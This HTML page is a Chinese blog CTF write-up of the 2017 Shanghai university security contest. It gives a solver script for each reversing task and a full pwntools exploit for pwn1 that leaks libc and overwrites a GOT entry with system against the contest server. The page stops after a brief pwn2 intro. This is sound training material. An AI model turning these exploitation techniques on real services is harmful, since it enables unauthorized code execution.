@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="这周末抽空打了一下这个比赛，感觉题目整体偏简单，可能是只是初赛的原因吧。 感觉带了两个高贵的web爷爷，除了web什么都不做，导致最后re，pwn，misc都是我一个人做的，表示很心累。 随手记录一下吧，反正都不难。 re1nspack，北斗的壳，岁数可能和我差不多？ 直接esp定律脱掉。 ida载入发现是简单的异或加密。 1234567891011key &#x3D; &amp;#x27;this_is_not_">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2017上海大学生网络安全大赛 部分writeup">
+<meta property="og:url" content="https://veritas501.github.io/2017_11_05-2017%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_%E9%83%A8%E5%88%86writeup/index.html">
+<meta property="og:site_name" content="veritas501&#39;s blog">
+<meta property="og:description" content="这周末抽空打了一下这个比赛，感觉题目整体偏简单，可能是只是初赛的原因吧。 感觉带了两个高贵的web爷爷，除了web什么都不做，导致最后re，pwn，misc都是我一个人做的，表示很心累。 随手记录一下吧，反正都不难。 re1nspack，北斗的壳，岁数可能和我差不多？ 直接esp定律脱掉。 ida载入发现是简单的异或加密。 1234567891011key &#x3D; &amp;#x27;this_is_not_">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://veritas501.github.io/2017_11_05-2017%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_%E9%83%A8%E5%88%86writeup/shanghaidaxuesheng_561a4815c34d8f8dfa7e7e37eed6ca2b.png">
+<meta property="og:image" content="https://veritas501.github.io/2017_11_05-2017%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_%E9%83%A8%E5%88%86writeup/shanghaidaxuesheng_859f1d78d0f53a2030ae3f21b279b2cc.png">
+<meta property="og:image" content="https://veritas501.github.io/2017_11_05-2017%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_%E9%83%A8%E5%88%86writeup/shanghaidaxuesheng_8fff5d41cc9d0a92daa1e2e82975cd4e.png">
+<meta property="og:image" content="https://veritas501.github.io/2017_11_05-2017%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_%E9%83%A8%E5%88%86writeup/shanghaidaxuesheng_2df96a2f07b5fdb7c33bf17b6904a16d.png">
+<meta property="og:image" content="https://veritas501.github.io/2017_11_05-2017%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_%E9%83%A8%E5%88%86writeup/shanghaidaxuesheng_6b12d578de7406a04ac3a39eeeee1459.png">
+<meta property="og:image" content="https://veritas501.github.io/2017_11_05-2017%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_%E9%83%A8%E5%88%86writeup/shanghaidaxuesheng_e170d1de220fed97d40173b2c3e6ae64.png">
+<meta property="og:image" content="https://veritas501.github.io/2017_11_05-2017%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_%E9%83%A8%E5%88%86writeup/shanghaidaxuesheng_28bb7c4f98bbf5dff1ef609a169fba09.png">
+<meta property="og:image" content="https://veritas501.github.io/2017_11_05-2017%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_%E9%83%A8%E5%88%86writeup/shanghaidaxuesheng_5026e2a9b35ccfa76cb02325996b344a.png">
+<meta property="article:published_time" content="2017-11-04T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-12-08T03:09:28.406Z">
+<meta property="article:author" content="veritas501">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://veritas501.github.io/2017_11_05-2017%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_%E9%83%A8%E5%88%86writeup/shanghaidaxuesheng_561a4815c34d8f8dfa7e7e37eed6ca2b.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>2017上海大学生网络安全大赛 部分writeup</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/veritas501">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2017_12_13-IO_FILE_%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2017_10_07-ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://veritas501.github.io/2017_11_05-2017%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_%E9%83%A8%E5%88%86writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://veritas501.github.io/2017_11_05-2017%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_%E9%83%A8%E5%88%86writeup/&text=2017上海大学生网络安全大赛 部分writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://veritas501.github.io/2017_11_05-2017%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_%E9%83%A8%E5%88%86writeup/&title=2017上海大学生网络安全大赛 部分writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://veritas501.github.io/2017_11_05-2017%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_%E9%83%A8%E5%88%86writeup/&is_video=false&description=2017上海大学生网络安全大赛 部分writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2017上海大学生网络安全大赛 部分writeup&body=Check out this article: https://veritas501.github.io/2017_11_05-2017%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_%E9%83%A8%E5%88%86writeup/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://veritas501.github.io/2017_11_05-2017%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_%E9%83%A8%E5%88%86writeup/&title=2017上海大学生网络安全大赛 部分writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://veritas501.github.io/2017_11_05-2017%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_%E9%83%A8%E5%88%86writeup/&title=2017上海大学生网络安全大赛 部分writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://veritas501.github.io/2017_11_05-2017%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_%E9%83%A8%E5%88%86writeup/&title=2017上海大学生网络安全大赛 部分writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://veritas501.github.io/2017_11_05-2017%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_%E9%83%A8%E5%88%86writeup/&title=2017上海大学生网络安全大赛 部分writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://veritas501.github.io/2017_11_05-2017%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_%E9%83%A8%E5%88%86writeup/&name=2017上海大学生网络安全大赛 部分writeup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://veritas501.github.io/2017_11_05-2017%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_%E9%83%A8%E5%88%86writeup/&t=2017上海大学生网络安全大赛 部分writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#re1"><span class="toc-number">1.</span> <span class="toc-text">re1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#re2"><span class="toc-number">2.</span> <span class="toc-text">re2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn1"><span class="toc-number">3.</span> <span class="toc-text">pwn1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn2"><span class="toc-number">4.</span> <span class="toc-text">pwn2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn3"><span class="toc-number">5.</span> <span class="toc-text">pwn3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc-%E7%99%BB%E6%9C%BA%E7%89%8C"><span class="toc-number">6.</span> <span class="toc-text">misc 登机牌</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc-clemency"><span class="toc-number">7.</span> <span class="toc-text">misc clemency</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc300"><span class="toc-number">8.</span> <span class="toc-text">misc300</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        2017上海大学生网络安全大赛 部分writeup
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">veritas501</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2017-11-04T16:00:00.000Z" class="dt-published" itemprop="datePublished">2017-11-05</time>
+        
+        (Updated: <time datetime="2023-12-08T03:09:28.406Z" class="dt-updated" itemprop="dateModified">2023-12-08</time>)
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>这周末抽空打了一下这个比赛，感觉题目整体偏简单，可能是只是初赛的原因吧。</p>
+<p>感觉带了两个高贵的web爷爷，除了web什么都不做，导致最后re，pwn，misc都是我一个人做的，表示很心累。</p>
+<p>随手记录一下吧，反正都不难。</p>
+<h2 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h2><p>nspack，北斗的壳，岁数可能和我差不多？</p>
+<p>直接esp定律脱掉。</p>
+<p>ida载入发现是简单的异或加密。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">&#x27;this_is_not_flag&#x27;</span></span><br><span class="line">enc=[<span class="number">0x12</span>,<span class="number">0x04</span>,<span class="number">0x08</span>,<span class="number">0x14</span>,<span class="number">0x24</span>,<span class="number">0x5C</span>,<span class="number">0x4A</span>,<span class="number">0x3D</span>,<span class="number">0x56</span>,<span class="number">0x0A</span>,<span class="number">0x10</span>,<span class="number">0x67</span>,<span class="number">0x00</span>,<span class="number">0x41</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x46</span>,<span class="number">0x5A</span>,<span class="number">0x44</span>,<span class="number">0x42</span>,<span class="number">0x6E</span>,<span class="number">0x0C</span>,<span class="number">0x44</span>,<span class="number">0x72</span>,<span class="number">0x0C</span>,<span class="number">0x0D</span>,<span class="number">0x40</span>,<span class="number">0x3E</span>,<span class="number">0x4B</span>,<span class="number">0x5F</span>,<span class="number">0x02</span>,<span class="number">0x01</span>,<span class="number">0x4C</span>,<span class="number">0x5E</span>,<span class="number">0x5B</span>,<span class="number">0x17</span>,<span class="number">0x6E</span>,<span class="number">0x0C</span>,<span class="number">0x16</span>,<span class="number">0x68</span>,<span class="number">0x5B</span>,<span class="number">0x12</span> ]</span><br><span class="line"></span><br><span class="line">key = <span class="built_in">map</span>(<span class="built_in">ord</span>,<span class="built_in">list</span>(key))</span><br><span class="line"></span><br><span class="line">out=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">	out.append(enc[i]^key[i%<span class="built_in">len</span>(key)])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>,out))</span><br></pre></td></tr></table></figure>
+
+<h2 id="re2"><a href="#re2" class="headerlink" title="re2"></a>re2</h2><p>ida看了一会，感觉逻辑有点乱，随意尝试了几组加密，发现加密基本可以说是逐位的。那么考虑爆破。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">enc = <span class="string">&#x27;FFIF@@IqqIH@sGBBsBHFAHH@FFIuB@tvrrHHrFuBD@qqqHH@GFtuB@EIqrHHCDuBsBqurHH@EuGuB@trqrHHCDuBsBruvHH@FFIF@@AHqrHHEEFBsBGtvHH@FBHuB@trqrHHADFBD@rquHH@FurF@@IqqrHHvGuBD@tCDHH@EuGuB@tvrrHHCDuBD@tCDHH@FuruB@tvrIH@@DBBsBGtvHH@GquuB@EIqrHHvGuBsBtGEHH@EuGuB@tvrIH@BDqBsBIFEHH@GFtF@@IqqrHHEEFBD@srBHH@GBsuB@trqrHHIFFBD@rquHH@FFIuB@tvrrHHtCDB@@&#x27;</span></span><br><span class="line"><span class="comment">#flag&#123;juck_code_cannot_stop_you_reversing&#125;</span></span><br><span class="line">out=<span class="string">&#x27;&#x27;</span></span><br><span class="line">enc_flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&#x27;0a&#123;&#x27;</span>:</span><br><span class="line">		<span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>,<span class="number">128</span>):</span><br><span class="line">			fd=<span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">			<span class="built_in">print</span> (out+<span class="built_in">chr</span>(c)).ljust(<span class="built_in">len</span>(out)+<span class="number">1</span>+(<span class="number">3</span>-(<span class="built_in">len</span>(out)+<span class="number">1</span>)%<span class="number">3</span>),j)</span><br><span class="line">			fd.write((out+<span class="built_in">chr</span>(c)).ljust(<span class="built_in">len</span>(out)+<span class="number">1</span>+(<span class="number">3</span>-(<span class="built_in">len</span>(out)+<span class="number">1</span>)%<span class="number">3</span>),j))</span><br><span class="line">			fd.close()</span><br><span class="line">		</span><br><span class="line">			r = os.popen(<span class="string">&#x27;juckcode.exe&#x27;</span>)</span><br><span class="line">			enc_flag = r.read()[:-<span class="number">1</span>]</span><br><span class="line">			<span class="comment">#print enc_flag</span></span><br><span class="line">			<span class="keyword">if</span> enc_flag[:<span class="number">8</span>*<span class="built_in">len</span>(out)+<span class="number">8</span>] == enc[:<span class="number">8</span>*<span class="built_in">len</span>(out)+<span class="number">8</span>]:</span><br><span class="line">				<span class="built_in">print</span> <span class="built_in">chr</span>(c),</span><br><span class="line">				out+=<span class="built_in">chr</span>(c)</span><br><span class="line">				<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><p>一开始看这个架势以为是堆的题，后来发现连free都没有。。。。</p>
+<p><img src="/2017_11_05-2017%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_%E9%83%A8%E5%88%86writeup/shanghaidaxuesheng_561a4815c34d8f8dfa7e7e37eed6ca2b.png"></p>
+<p>chunk_num可以无限递减。</p>
+<p><img src="/2017_11_05-2017%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_%E9%83%A8%E5%88%86writeup/shanghaidaxuesheng_859f1d78d0f53a2030ae3f21b279b2cc.png"></p>
+<p><img src="/2017_11_05-2017%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_%E9%83%A8%E5%88%86writeup/shanghaidaxuesheng_8fff5d41cc9d0a92daa1e2e82975cd4e.png"></p>
+<p>edit和show基本没有限制，一个任意地址读，一个任意写，只要地址在chunk_list前即可。</p>
+<p>考虑在前面找一个到got表的指针即可。</p>
+<p><img src="/2017_11_05-2017%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_%E9%83%A8%E5%88%86writeup/shanghaidaxuesheng_2df96a2f07b5fdb7c33bf17b6904a16d.png"></p>
+<p>直接劫持程序流即可。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;terminator&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;bash&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">	cn = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">2222</span>)</span><br><span class="line">	<span class="built_in">bin</span> = ELF(<span class="string">&#x27;./list&#x27;</span>)</span><br><span class="line">	libc = ELF(<span class="string">&#x27;libc_local.so&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	cn = remote(<span class="string">&#x27;106.75.8.58&#x27;</span>, <span class="number">13579</span>)</span><br><span class="line">	<span class="built_in">bin</span> = ELF(<span class="string">&#x27;./list&#x27;</span>)</span><br><span class="line">	libc = ELF(<span class="string">&#x27;remote_libc.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">z</span>(<span class="params">a=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">	gdb.attach(cn,a)</span><br><span class="line">	<span class="keyword">if</span> a == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">		raw_input()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">con</span>):</span><br><span class="line">	cn.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	cn.recvuntil(<span class="string">&#x27;content&#x27;</span>)</span><br><span class="line">	cn.send(con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">	cn.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">con</span>):</span><br><span class="line">	cn.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	cn.sendline(con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>():</span><br><span class="line">	cn.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cn.recvuntil(<span class="string">&#x27;choise&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">263007</span>):</span><br><span class="line">	cn.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;send done&quot;</span>)</span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">	data=cn.recv(<span class="number">4096</span>)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&#x27;\x7f&#x27;</span> <span class="keyword">in</span> data:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">data = cn.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line">success(data.encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line"></span><br><span class="line">atoi = u64(data+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">2</span>)</span><br><span class="line">system = atoi-libc.symbols[<span class="string">&#x27;atoi&#x27;</span>]+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">success(<span class="built_in">hex</span>(system))</span><br><span class="line">cn.interactive()</span><br><span class="line">edit(p64(system))</span><br><span class="line"></span><br><span class="line">cn.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h2><p>没什么花样的UAF，网上自己找教程吧。</p>
